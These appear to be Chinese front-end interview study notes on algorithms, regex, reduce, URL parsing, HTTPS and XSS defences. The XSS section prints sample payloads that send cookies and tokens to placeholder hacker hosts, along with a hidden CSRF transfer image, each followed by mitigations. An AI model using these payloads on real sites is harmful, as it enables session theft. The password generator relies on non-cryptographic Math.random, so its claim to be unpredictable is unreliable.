## 移动零

https://leetcode.cn/problems/move-zeroes/description/?spm=5176.28103460.0.0.39f22988vwQeSI

给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。

请注意 ，必须在不复制数组的情况下原地对数组进行操作。

- 同时保持非零元素的相对顺序
    稳定性 在操作后仍保持元素的相对顺序不变
    **不稳定排序——Selection Sort（选择排序）**

### 插入排序

将数组分为已排序和未排序两部分，每次从未排序部分取出一个元素，将其插入到已排序部分的正确位置，直到所有元素都完成插入。

```
function insertionSort(arr) {
  const len = arr.length;
  // 从第2个元素开始遍历（默认第1个元素是有序的）
  for (let i = 1; i < len; i++) {
    let current = arr[i]; // 取出当前要插入的元素
    let j = i - 1;        // j 指向已排序区的最后一个元素
    
    // 在已排序区从后向前扫描，寻找插入位置
    // 如果发现已排序的元素比当前元素大，就将其向后移动一位
    while (j >= 0 && arr[j] > current) {
      arr[j + 1] = arr[j];
      j--;
    }
    
    // 将当前元素插入到正确的位置（即 j + 1）
    arr[j + 1] = current;
  }
  return arr;
}

// 测试
const myArray = [4, 3, 2, 10, 12, 1, 5, 6];
console.log("排序前:", myArray);
console.log("排序后:", insertionSort(myArray));
```

###  不稳定案例 

让我们对数组 [5, 8, 5, 2] 进行升序排序

为了清晰地区分两个 5，我们称第一个为 5a，第二个为 5b。

1. 第一轮：
在整个数组 [5a, 8, 5b, 2] 中找到最小值，是 2。
将 2 与第一个位置的元素 5a 进行交换。
数组变为：[2, 8, 5b, 5a]
关键点： 就在这一步，5b 已经被交换到了 5a 的前面，它们的相对顺序被破坏了。

2. 第二轮：
在剩余未排序部分 [8, 5b, 5a] 中找到最小值，是 5b。
将 5b 与第二个位置的元素 8 进行交换。
数组变为：[2, 5b, 8, 5a]

3. 第三轮：
在剩余未排序部分 [8, 5a] 中找到最小值，是 5a。
将 5a 与第三个位置的元素 8 进行交换。
数组变为：[2, 5b, 5a, 8]

结果对比
排序前： [5a, 8, 5b, 2] ( 5a 在 5b 之前 )
排序后： [2, 5b, 5a, 8] ( 5b 在 5a 之前 )


- 原地操作（In-place）特性

    空间复杂度 不随输入规模增长而增加额外内存

### 如果违反

如果允许复制数组，我们只需要创建一个新数组，先遍历一遍把非零元素按顺序放进去，再在末尾补上相应数量的 0 就可以了。

空间复杂度会变成 
O(n) ，因为我们需要一个和原数组一样大的新数组来存放结果。

如果不考虑稳定性，我们只需要使用双指针，一头一尾向中间扫描，遇到 0 就和末尾的非零元素交换，这样虽然简单高效，但会打乱非零元素原本的顺序。

### 这题的核心其实就三个关键词：原地操作 + O(1) 空间 + 稳定性。

用双指针：一个指针 j 指向下一个要放非零元素的位置，遍历数组用 i 扫描，遇到非零就交换到 j，然后 j++，这样既保证原地操作，又保持相对顺序。

```
function moveZeroes(nums) {
  // j 指向下一个非零元素应该放的位置
  let j = 0;

  for (let i = 0; i < nums.length; i++) {
    // 如果当前元素不是 0
    if (nums[i] !== 0) {
      // 交换 nums[i] 和 nums[j]
      // 这样可以保证：
      // 1. 非零元素被“挤”到前面
      // 2. 顺序不变（稳定）
      [nums[i], nums[j]] = [nums[j], nums[i]];
      
      j++; // 更新下一个非零位置
    }
  }
}
```

## LCP 06. 拿硬币

https://leetcode.cn/problems/na-ying-bi/?spm=5176.28103460.0.0.39f22988vwQeSI

桌上有 n 堆力扣币，每堆的数量保存在数组 coins 中。我们每次可以选择任意一堆，拿走其中的一枚或者两枚，求拿完所有力扣币的最少次数。

示例 1：

输入：[4,2,1]

输出：4

解释：第一堆力扣币最少需要拿 2 次，第二堆最少需要拿 1 次，第三堆最少需要拿 1 次，总共 4 次即可拿完。

示例 2：

输入：[2,3,10]

输出：8

### 贪心算法

贪心就是每一步都选当前最优，比如找零钱总先用最大面额，图省事但不一定全局最优。

动态规划会记录子问题最优解，综合得到全局最优，更稳但更复杂。

### 贪心的问题

经典例子：找零钱问题（非标准面额）
比如面额有：1、3、4，要凑 6

贪心做法（每次选最大）
先选 4 → 剩 2
再选 1 → 剩 1
再选 1 → 剩 0

👉 一共用了 3 枚硬币（4+1+1）

最优解
选 3 + 3

👉 只用 2 枚硬币

贪心只看当前最优（优先选最大面额），图省事但可能错过更优组合。

可以，用**动态规划（Dynamic Programming）**可以稳定得到最优解。

思路（核心一句话）

把“凑到 x 的最少硬币数”拆成：

min(凑到 x-1, x-3, x-4) + 1

📌 状态定义

设：

dp[i] = 凑到金额 i 的最少硬币数
🚀 初始化
dp[0] = 0

其他初始化为无穷大

🔁 状态转移
dp[i] = min(
  dp[i-1],
  dp[i-3],
  dp[i-4]
) + 1

dp[6] = 2  → (3 + 3)

动态规划会枚举所有可能的拆分路径并保存子问题最优解，所以能保证得到全局最优解。

### 给你一个整数数组 coins ，表示不同面额的硬币；以及一个整数 amount ，表示总金额。

https://leetcode.cn/problems/coin-change/description/

计算并返回可以凑成总金额所需的 最少的硬币个数 。如果没有任何一种硬币组合能组成总金额，返回 -1 。

你可以认为每种硬币的数量是无限的。

输入：coins = [1, 2, 5], amount = 11
输出：3 
解释：11 = 5 + 5 + 1

```javascript
/**
 * LeetCode 322 - Coin Change
 * 返回凑成 amount 所需的最少硬币数
 */
function coinChange(coins, amount) {
    // dp[i]：表示凑成金额 i 的最少硬币数
    //   一开始默认：所有金额都无法凑出来 Infinity
    // 后面通过状态转移慢慢“更新更小值”
    // + 1 要把“当前这一枚硬币”也算进去，所以在子问题结果基础上再加 1 
  const dp = new Array(amount + 1).fill(Infinity);

  // 初始化：凑成 0 需要 0 枚硬币
  dp[0] = 0;

  // 遍历每一个金额
  for (let i = 1; i <= amount; i++) {
    // 尝试每一种硬币
    for (let coin of coins) {
      // 如果当前硬币可以使用（不超过当前金额）
      if (i - coin >= 0) {
        // 状态转移：
        // 选或不选当前 coin，取最小值
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }

  // 如果还是 Infinity，说明无法凑出
  return dp[amount] === Infinity ? -1 : dp[amount];
}
```

### LCP 06. 拿硬币 解法

每一堆都尽量一次拿2枚（能省一步就省一步），最后如果是奇数再补1次。

对每一堆：

偶数：x / 2
奇数：Math.floor(x / 2) + 1

等价于： Math.ceil(x / 2)  向上取整

```js
/**
 * 每次可以拿1或2枚，求最少操作次数
 * 贪心：每堆尽量每次拿2枚
 */
function minSteps(coins) {
  let res = 0;

  for (let x of coins) {
    // 每堆最优策略：尽可能每次拿2
    // 奇数最后多一次1
    res += Math.ceil(x / 2);
  }

  return res;
}
```

为什么这是贪心？

因为每一步都在做局部最优：

能拿2就不拿1

且这个问题没有“后续影响”，所以局部最优 = 全局最优。

## 正则匹配邮箱

正则就是用一套特定的符号规则，来描述和匹配一类字符串的通用模式。

第一步：最朴素版本（只看结构）

邮箱基本结构：

xxx@xxx.xxx

正则

/.+@.+\..+/

.+：任意字符（至少一个）
@：必须有 @
\.：点（需要转义）

问题

可以匹配 @@@

可以匹配 a@b

太宽松，只是“形状匹配”

第二步：限制基本字符

优化思路

邮箱一般只允许：

字母
数字
_ . -

正则

/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/

用户名部分
[a-zA-Z0-9._-]+

域名部分
[a-zA-Z0-9.-]+

顶级域
[a-zA-Z]{2,}

改进点
有基本格式约束
限制非法字符

仍然问题
a..b@@..com 仍可能通过
.abc@xxx.com 不合法但可能通过


第三步：结构约束加强

思路升级

我们要防止：

连续点
开头结尾点
多个 @

/^[a-zA-Z0-9]+([._-]?[a-zA-Z0-9]+)*@
[a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.
[a-zA-Z]{2,}$/

① 用户名（不能连续特殊符号）

[a-zA-Z0-9]+([._-]?[a-zA-Z0-9]+)*

含义：

不能以 ._- 开头
特殊符号必须夹在字符中间 ？ 0次或一次
* 代表前面的字符出现 0 次或多次。

② 域名
[a-zA-Z0-9]+(-[a-zA-Z0-9]+)*

支持：

baidu
my-site

③ 顶级域
[a-zA-Z]{2,}

## 实现一个reduce方法

### 函数式编程（Functional Programming）

把“计算过程”看成函数之间的组合，尽量用纯函数 + 不修改外部状态来解决问题。

核心特点（先记住3个就够面试）
1. 纯函数（同输入必同输出，无副作用）
2. 不可变数据（不修改原数据）
3. 函数可以当参数传递 / 返回

### 纯函数

```js 
// 不是纯函数
// 这个函数依赖了外部的 count 变量。即使你不传任何参数，每次调用它返回的结果都不一样，而且它还修改了外部状态。
let count = 0; // 外部状态

function notPure() {
  count++;      // 副作用：修改了外部变量
  return count; // 输出不固定：第一次调返回1，第二次返回2...
}
// 是纯函数
function pure(x) {
  return x * x; // 仅依赖输入 x，且没有副作用
}
```

### 不可变数据（不修改原数据）

在编程中，理解“可变”与“不可变”数据，最直观的方法就是看操作后原始数据是否被改变。

```js
// 1. 原始数组
const originalArr = [1, 2, 3];

// 2. 使用 push 方法直接修改原始数组
const returnedArr = originalArr.push(4);

// 3. 查看结果
console.log(originalArr); // [1, 2, 3, 4] -> 原始数组被改变了！
console.log(returnedArr); // 4 -> push 方法返回的是新数组的长度，而不是新数组
```

js 会修改原数组的方法

push()、pop()、shift()、unshift()、splice()原地修改数组 删除、插入和替换、sort()、reverse()、fill()、copyWithin(ES6) 在同一个数组内部进行元素的“复制粘贴

不会修改原数组的方法
concat()
slice()
map()
filter()
reduce()
reduceRight()
forEach()
find()
findIndex()
some()
every()
join()
indexOf()
lastIndexOf()
includes()
flat()
flatMap()
toReversed()
toSorted()
toSpliced()
with()

### 为什么说数组的reduce 方法是函数式编程？

reduce 方法的核心作用是将数组中的所有元素通过一个“累加”过程，最终归约（或称“折叠”）成一个单一的值。

它是如何工作的？

reduce 方法接收两个参数：一个回调函数和一个可选的初始值。

它会遍历数组，并在每次迭代中执行回调函数。

主要应用场景
reduce 的功能远不止于求和，它的强大之处在于其返回值可以是任意类型，这使其成为处理复杂数据的利器。

```js
const numbers = [1, 2, 3, 4];
// 计算总和，初始值为 0
const sum = numbers.reduce((acc, curr) => acc + curr, 0);
console.log(sum); // 输出: 10


```

数据结构转换

```
const users = [
  { id: 101, name: 'Alice' },
  { id: 102, name: 'Bob' }
];
// 将数组转换为以 id 为键的对象
const userMap = users.reduce((acc, user) => {
  acc[user.id] = user;
  return acc;
}, {});
console.log(userMap[101].name); // 输出: 'Alice'
```

数据统计与分组

```js
const fruits = ['apple', 'banana', 'apple', 'orange'];
// 统计每个水果出现的次数
const count = fruits.reduce((acc, fruit) => {
  acc[fruit] = (acc[fruit] || 0) + 1;
  return acc;
}, {});
console.log(count); // 输出: { apple: 2, banana: 1, orange: 1 }
```

数组扁平化

```
const nestedArr = [[1, 2], [3, 4], [5]];
// 将二维数组扁平化
const flatArr = nestedArr.reduce((acc, curr) => acc.concat(curr), []);
console.log(flatArr); // 输出: [1, 2, 3, 4, 5]
```

reduce接收函数参数，通过纯函数逻辑将数组归约为单值，全程不修改原数据。它完美体现了纯函数、不可变数据及高阶函数这三大函数式编程核心特性。

- 手写
```js
Array.prototype.myReduce = function(callback, initialValue) {
  // 1. 边界检查：确保 this 是数组且 callback 是函数
  if (this === null || typeof callback !== "function") {
    throw new TypeError("Invalid arguments");
  }
    // 兼容“类数组对象”
   // 当 this 是原始类型（如数字、字符串）时，代码就会因为无法获取属性而报错。
   // // 尝试在一个数字上调用 reduce
// 此时，reduce 内部的 this 是数字 123
// try {
//   Array.prototype.reduce.call(123, (acc, curr) => acc + curr, 0);
// } catch (e) {
//   console.log(e.message);
// }
    // 
  const arr = Object(this); // 将 this 转为对象
// 加了 Object(this) 会发生什么？
// Object(123) 会将原始数字包装成对象（相当于 new Number(123)）。
// 现在它是一个对象了。
// 虽然 Number 对象也没有 length 属性（会得到 undefined），但代码不会报错崩溃，而是会继续执行，最终可能得到 0 或 NaN 等结果，保证了程序的健壮性。
  // arr.length 5.9 5 直接截断小数部分，向下取整。
  // 在正常的 JavaScript 数组中，length 属性确实永远是一个整数，它会自动更新，你无法直接将其设置为 5.9。
  // reduce 方法的实现（尤其是 Polyfill）需要考虑所有可能性，包括一些“不正常”或“边缘”的情况。length 出现小数的情况，通常发生在以下两种场景：
  // 场景一：类数组对象 (Array-like Object)
  // reduce 方法不仅可以被数组调用，还可以通过 call 或 apply 在一个“长得像数组”的对象上执行。这类对象有 length 属性和索引，但不是真正的数组，因此它们的 length 属性没有数组那样的自动维护机制，可以是任意值。

  // const fakeArray = {
//   0: 'a',
//   1: 'b',
//   2: 'c',
//   length: 5.9 // 这不是一个真正的数组，所以 length 可以是小数
// };
// const result = Array.prototype.reduce.call(fakeArray, (acc, curr) => {
//   return acc + curr;
// }, '');

// console.log(result); 
  // "10" 字符串 10 先转为数字，再转为无符号整数。
  // >>> 是 JavaScript 中的无符号右移运算符。
  // >>> 运算符在执行移位前，会先做两步操作：
  // ToNumber: 将操作数转换为数字。
  // ToUint32: 将数字转换为32位的无符号整数。
  // 我们是右移 0 位，所以数值本身没有发生位移，但它的数据类型已经被强制规范化了。
  const len = arr.length >>> 0; // 获取长度
  let accumulator; // 累加器
  let startIndex;  // 遍历起始索引

  // 2. 处理初始值
  if (initialValue !== undefined) {
    accumulator = initialValue;
    startIndex = 0; // 有初始值，从索引 0 开始
  } else {
    // 无初始值，从索引 1 开始，累加器默认为第一项
    if (len === 0) {
      // 空数组且无初始值，必须报错
      throw new TypeError("Reduce of empty array with no initial value");
    }
    accumulator = arr[0];
    startIndex = 1;
  }

  // 3. 循环遍历并执行回调
  for (let i = startIndex; i < len; i++) {
    // 兼容稀疏数组（跳过空位）
    if (i in arr) {
      accumulator = callback(accumulator, arr[i], i, arr);
    }
  }

  return accumulator;
};
```

### useReducer 将组件状态视作“累加器”，通过纯函数 Reducer 将分散的 Action 归约为确定性的新状态，实现逻辑的集中与可预测。

```js
import React, { useReducer, useState } from 'react';

// 1. 定义初始状态 (Initial State)
const initialState = {
  todos: [
    { id: 1, text: '学习 useReducer', done: false },
    { id: 2, text: '掌握函数式编程', done: true }
  ]
};

// 2. 定义 Reducer (纯函数：State + Action -> New State)
// 这里体现了“归约”的思想：根据 action 类型，计算出新的 todos 数组
function todoReducer(state, action) {
  switch (action.type) {
    case 'ADD':
      // 不可变性：返回新数组，而不是 push 到旧数组
      return {
        ...state,
        todos: [...state.todos, { id: Date.now(), text: action.payload, done: false }]
      };
    
    case 'TOGGLE':
      // 映射：找到对应 ID 的项，翻转其 done 状态
      return {
        ...state,
        todos: state.todos.map(todo =>
          todo.id === action.payload ? { ...todo, done: !todo.done } : todo
        )
      };

    case 'DELETE':
      // 过滤：移除指定 ID 的项
      return {
        ...state,
        todos: state.todos.filter(todo => todo.id !== action.payload)
      };

    default:
      // 未知操作，返回原状态
      return state;
  }
}

// 3. 组件实现
export default function TodoApp() {
  const [state, dispatch] = useReducer(todoReducer, initialState);
  const [inputValue, setInputValue] = useState('');

  // 处理添加
  const handleAdd = () => {
    if (!inputValue.trim()) return;
    // 发送指令（Action），而不是直接修改数据
    dispatch({ type: 'ADD', payload: inputValue });
    setInputValue('');
  };

  return (
    <div style={{ padding: '20px', fontFamily: 'Arial' }}>
      <h2>useReducer TodoList</h2>
      
      {/* 输入区域 */}
      <div style={{ marginBottom: '20px' }}>
        <input
          type="text"
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          placeholder="输入待办事项..."
          style={{ padding: '8px', width: '70%' }}
        />
        <button onClick={handleAdd} style={{ padding: '8px 16px', marginLeft: '10px' }}>
          添加
        </button>
      </div>

      {/* 列表区域 */}
      <ul style={{ listStyle: 'none', padding: 0 }}>
        {state.todos.map(todo => (
          <li key={todo.id} style={{ 
            display: 'flex', 
            justifyContent: 'space-between', 
            padding: '10px', 
            borderBottom: '1px solid #eee',
            textDecoration: todo.done ? 'line-through' : 'none',
            color: todo.done ? '#999' : '#333'
          }}>
            <span onClick={() => dispatch({ type: 'TOGGLE', payload: todo.id })} style={{ cursor: 'pointer' }}>
              {todo.text}
            </span>
            <button 
              onClick={() => dispatch({ type: 'DELETE', payload: todo.id })}
              style={{ color: 'red', border: 'none', background: 'none', cursor: 'pointer' }}
            >
              删除
            </button>
          </li>
        ))}
      </ul>
    </div>
  );
}
```

## 手写提取url

?name=john&age=30
&hobbies=run&hobbies=dance
&location[city]=new20%work

返回name,age,hobbies,city

{
  "name": "john",
  "age": "30",
  "hobbies": ["run", "dance"],
  "city": "new work"
}

### URL 查询参数解析题

- 同名参数（hobbies=run&hobbies=dance）要解析成数组
  遍历参数键值对，判断键是否已存在，不存在则存单个值，存在则将原值转为数组并追加新值，最终同名参数自动成数组
  ```
  const result = {};
  // 遍历每一组参数 key=value
  for (const [key, value] of params) {
    if (result[key] === undefined) {
      // 第一次存单个值
      result[key] = value;
    } else {
      // 已存在 → 转数组并追加
      // [] 空数组 concat  
      result[key] = [].concat(result[key], value);
    }
  }
  ```
- URL 编码（%20）要转成空格
  URL 规范中空格是非法字符，无法直接传输，所以要用%20这种 URL 编码格式替代，才能保证数据在网络中正确传递。
  decodeURIComponent 
- 嵌套参数（location[city]）要提取为city字段
  提取出 city 作为最终字段名，忽略外层的 location。
  ```js
  function parseKey(key) {
    const match = key.match(/\[([^\]]+)\]$/);
    return match ? match[1] : key;
  }
  const key = "location[city]";
  const finalKey = parseKey(key); 
  ```

- 代码

```js
/**
 * 解析URL查询字符串，转换成指定格式的JSON对象
 * @param {string} queryStr - URL参数字符串
 * @returns {object} 解析后的对象
 */
function parseUrlQuery(queryStr) {
  // 1. 初始化结果对象
  const result = {};

  // 2. 使用URLSearchParams解析参数（自动处理&分隔）
  // 自动拆分键值对
  const params = new URLSearchParams(queryStr);

  // 3. 遍历所有参数键值对
  for (const [key, value] of params) {
    // ====================== 处理1：URL解码（%20 → 空格）======================
    const decodedValue = decodeURIComponent(value);

    // ====================== 处理2：提取嵌套key（location[city] → city）======================
    const matched = key.match(/^.+\[(.+)\]$/); // 正则匹配 [xxx]
    const finalKey = matched ? matched[1] : key;

    // ====================== 处理3：同名参数转数组（hobbies=run&hobbies=dance）======================
    if (result[finalKey] === undefined) {
      // 第一次出现，直接赋值
      result[finalKey] = decodedValue;
    } else {
      // 已存在，转为数组并追加
      result[finalKey] = [].concat(result[finalKey], decodedValue);
    }
  }

  // 4. 返回最终结果
  return result;
}

// ========== 测试调用 ==========
const urlParams = `?name=john&age=30&hobbies=run&hobbies=dance&location[city]=new%20work`;
const res = parseUrlQuery(urlParams);
console.log(res);
```

## 手写随机密码生成函数

请用 JavaScript 实现一个函数 generatePassword()，生成一个 8 位随机密码。

要求：
1. 密码长度固定 8 位；
2. 字符集包含：大小写字母（a-z、A-Z）+ 数字（0-9）；
3. 字符随机分布，不可预测；
4. 无需考虑密码强度（如必须含大写 / 数字），纯随机即可；
5. 直接返回字符串，无需其他参数。

输出类似："7sKp9xQ2"、"aZ8bL3mP" 等 8 位混合字符串

```js
function generatePassword() {
  // 1. 定义字符集：大小写字母 + 数字
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let password = '';
  // 2. 循环 8 次，每次随机取一个字符
  for (let i = 0; i < 8; i++) {
    const randomIndex = Math.floor(Math.random() * chars.length);
    password += chars[randomIndex];
  }
  // 3. 返回结果
  return password;
}
```

### 强密码版（必须含大小写 + 数字）

- 必须至少包含 1 个大写字母、1 个小写字母、1 个数字；
- 其余字符随机。

```
/**
 * 生成8位强密码
 * 强制包含：小写字母、大写字母、数字
 * 其余字符从混合字符集随机选取
 */
function generateStrongPwd() {
  // 1. 拆分三类必选字符集
  const lower = 'abcdefghijklmnopqrstuvwxyz'; // 小写
  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; // 大写
  const number = '0123456789';                // 数字
  // 混合总字符集
  const all = lower + upper + number;

  // 2. 先各自必取一位，保证密码强度
  let pwd = '';
  // 随机取1位小写
  pwd += lower[Math.floor(Math.random() * lower.length)];
  // 随机取1位大写
  pwd += upper[Math.floor(Math.random() * upper.length)];
  // 随机取1位数字
  pwd += number[Math.floor(Math.random() * number.length)];

  // 3. 还差 5位，从全部字符随机补全
  for (let i = 0; i < 5; i++) {
    const idx = Math.floor(Math.random() * all.length);
    pwd += all[idx];
  }

  // 4. 打乱顺序（避免前三位固定：小、大、数）
  // 字符串转数组打乱再拼接
  return pwd.split('').sort(() => 0.5 - Math.random()).join('');
}

// 测试
console.log(generateStrongPwd());
```

## 为什么https 比http 更安全

### https

HTTPS = HTTP (应用层) + SSL/TLS (表示层) + TCP (传输层 底层)

┌─────────────────────────────┐
│ 7 应用层   Application      │  ← HTTP、HTTPS、FTP、DNS
├─────────────────────────────┤
│ 6 表示层   Presentation     │  ← SSL / TLS 加密解密（HTTPS核心）
├─────────────────────────────┤
│ 5 会话层   Session          │
├─────────────────────────────┤
│ 4 传输层   Transport        │  ← TCP 可靠传输
├─────────────────────────────┤
│ 3 网络层   Network          │  ← IP
├─────────────────────────────┤
│ 2 数据链路层 Data Link     │  ← MAC、交换机
├─────────────────────────────┤
│ 1 物理层   Physical        │  ← 网线、信号
└─────────────────────────────┘

HTTP/https 跑在第七层应用层，
SSL/TLS 加密在第六层表示层，
下层依托 四层 TCP、三层 IP。

SSL：Secure Sockets Layer，安全套接层 
TLS：Transport Layer Security，传输层安全协议

TLS 是 SSL 的升级版，现在 HTTPS 实际用的都是 TLS。

表示层负责数据加解密（对称加密）、格式转换（前端发UTF-8，老服务器只认GBK，表示层自动转码，避免乱码， Content-Type: text/html; charset=utf-8）、编码处理、压缩解压（Accept-Encoding: gzip, deflate, br）、序列化（form 标签原生提交 不会自动序列化，要手动 stringify ），统一数据格式与安全规则，让两端正常解析通信。


可以把 HTTPS 想成你用信鸽给服务器寄一封绝密信：一开始你先打个招呼，说“我支持这些加密方式”，服务器回你一封信，顺便把自己的“公钥”（锁）和证书（权威机构颁发）一起给你，你先验证这个证书是真的（防止对面是冒充的），确认没问题后，你自己生成一个随机的“会话密码”（后面真正用来加密数据的对称密钥），但这个密码不能直接明文发，于是你用服务器给你的公钥把它加密，再通过信鸽发过去，只有服务器手里的私钥能解开；服务器解开后，你们双方就拿到了同一个“会话密码”，接下来所有通信就都用这个对称密钥来加密和解密，因为它速度快、效率高，所以整个过程其实就是：先用非对称加密安全地把“密码”传过去，再用对称加密高效地传输真正的数据。

## 你知道什么是XSS 怎么做到的？

XSS：Cross-Site Scripting，跨站脚本攻击

攻击者往网页注入恶意 JS 代码，别人访问页面时自动执行，盗取 Cookie、localStorage, 篡改页面或窃取用户信息。

- 配置正确的 Cookie ，比 localStorage 安全得多。

  - HttpOnly
  开启 HttpOnly 后，浏览器禁止 JS 读取操作 Cookie，就算遭遇 XSS 攻击，黑客也偷不到 Cookie。

  - SameSite 是 Cookie 跨域请求限制策略，分 Strict（完全禁止跨站携带 Cookie，）、Lax（允许简单跨站 GET 跳转带 Cookie）、None（所有跨站请求都携带 Cookie，），用来拦截非法跨站请求，抵御 CSRF 攻击，保障接口安全。
    - XSS 本质：恶意 JS 在当前同源页面内部运行，合法同域环境，SameSite 管不了同域脚本；
    - CSRF 本质：诱导用户从外部跨站偷偷发请求，SameSite 就是用来拦截这类跨站非法请求的。
      - 你登录了银行官网，浏览器存好了你的 Cookie；
      - 你没退出登录，又点开黑客垃圾网页；
      - 黑客页面藏了一行隐形代码，自动向银行接口发转账请求；
      <img src="https://bank.com/transfer?to=hacker&money=1000" style="display:none">
      - 浏览器自动带上你的银行 Cookie，网站误以为是你本人操作，直接转账。

  - secure
    - 标记了 Secure 的 Cookie，只在 HTTPS 加密请求下才会发送；
    - 普通 HTTP 明文请求，绝对不会携带该 Cookie；
    - 防止在不安全的明文网络里，被中间人抓取、窃取 Cookie。
    防明文抓包泄露

### 怎么做到的

1. 存储型 XSS（永久 XSS）
黑客把恶意 JS 提交到网站数据库（评论、留言、发帖），所有用户访问该页面都会自动执行恶意代码，危害最大。
  论坛评论区，后端没做特殊字符过滤，直接存入数据库，所有人可见。
  <script>
// 盗取当前用户 localStorage、Cookie 并发送给黑客
fetch('https://hack.com/steal?data='+document.cookie+localStorage.token)
</script>

  输入过滤 前后端统一过滤特殊字符：< > & " '，拦截恶意标签与脚本特征。
  输出转义 页面渲染数据时，对用户内容做HTML 转义，把标签变为普通文本，无法执行。
  CSP 内容安全策略 限制脚本加载来源，禁止执行内联脚本、非法外部脚本，从根源拦截恶意 JS。


2. 反射型 XSS（一次性 XSS）
恶意代码藏在 URL 参数里，诱导用户点击恶意链接，页面瞬时反射执行脚本，只针对当前点击的人生效。
  网站搜索页，URL 参数直接拼接到页面展示，不过滤、不转义。
  http://test.com/search?key=手机
  页面直接显示：你搜索的内容：手机
  http://test.com/search?key=<script>alert('偷你信息')</script>

  - 黑客把这条链接发给你，诱导你点击；
  - 服务器拿到 URL 里的 key 参数，直接原样返回渲染到页面；
  - 浏览器解析页面，恶意 script 立刻执行；
  - 只在本次打开链接生效，数据不存数据库，关掉页面就没了，所以叫「一次性」。

  http://test.com/search?key=<script>fetch('https://hack.cn/steal?c='+document.cookie)</script>

  参数严格过滤
  后端校验 URL 参数，过滤 < > " ' & 等特殊脚本字符。
  输出 HTML 转义
  页面渲染 URL 传入的变量时，强制转义，让标签变成纯文本，无法执行。
  禁止直接拼接参数
  后端 / 前端不要把 URL 参数直接拼入 HTML 页面代码。
  开启 CSP 策略
  禁止未知内联脚本执行，拦截恶意代码运行。
  Cookie 加固
  配置 HttpOnly，就算被注入脚本，也偷不到登录 Cookie。

3. DOM 型 XSS
不经过服务器，纯前端 JS 直接操作 DOM，拼接恶意内容渲染页面，本地前端代码漏洞直接触发攻击。 

不经过服务器、不存数据库，纯前端 JS 直接操作 DOM 造成漏洞。

<body>
  <div id="box"></div>

  <script>
    // 直接获取URL参数，用 innerHTML 渲染
    let name = location.search.split('name=')[1];
    document.getElementById('box').innerHTML = name;
  </script>

  http://xxx.com?name=<img src=x onerror="alert('偷信息')">

  黑客发恶意链接，用户点开；
  前端 JS 直接读取 URL 参数；
  用 innerHTML 把恶意代码写入页面；
  加载报错触发 onerror，恶意代码执行；
  全程服务器无感知、无数据存储，只在当前浏览器生效。


  DOM 型 XSS 解决办法
  禁用危险 API：不用 innerHTML、document.write
  安全渲染：改用 textContent 纯文本展示
  对 URL 参数做转义过滤
  开启 CSP 限制内联事件脚本

- 反射型XSS和DOM型XSS的区别是什么？

  反射型过服务器，DOM 型不过服务器。

## 前端相关AI
### Figma
Figma 是云端 UI/UX 设计工具，支持多人实时协作、跨平台使用，兼具设计、原型与交付能力。

在传统互联网公司里，日常用 Figma 做界面 / 原型的，主要是 UI/UX 设计师（交互 / 视觉设计师）。

按角色分：
- UI 设计师：画页面、做视觉、组件库、标注切图（主力）。
- UX / 交互设计师：画流程、线框图、高保真原型（常用 Figma）。
- 产品经理：偶尔用 Figma 搭简单原型、标注需求，但不做精细设计。
- 前端 / 客户端：只看稿、拿标注，不负责设计。

干活的是 UI/UX 设计师，产品经理会用但不负责设计， 前端根据 UI 设计师输出的 Figma 设计稿，还原页面结构、样式、交互，实现高保真视觉效果与功能。


## 了解linux 

- 日常命令都能独立使用
  - 文件操作ls、cd、mkdir、rm、cp、mv
  - 文件查看编辑cat、vim、less
    cat 1.txt 2.txt 查看单个或多个文件 
    cat > test.txt <<EOF
    第一行内容
    第二行内容
    第三行内容
    EOF
    Vim 是 高性能模态文本编辑器 不需要鼠标
      快捷键强大
      竖向选择 ctrl + v
  - 权限管理
    chmod 
      chmod -R 777 文件名 
      -R 把这个目录 + 里面所有文件、子文件夹 全部生效 最高权限
    chown 修改 文件 / 文件夹 的 所属用户 和 所属组
    chown root test.txt 把 test.txt 归属改成 root 用户

  - 进程端口ps、top、kill、netstat
  - 网络请求curl、ping
    
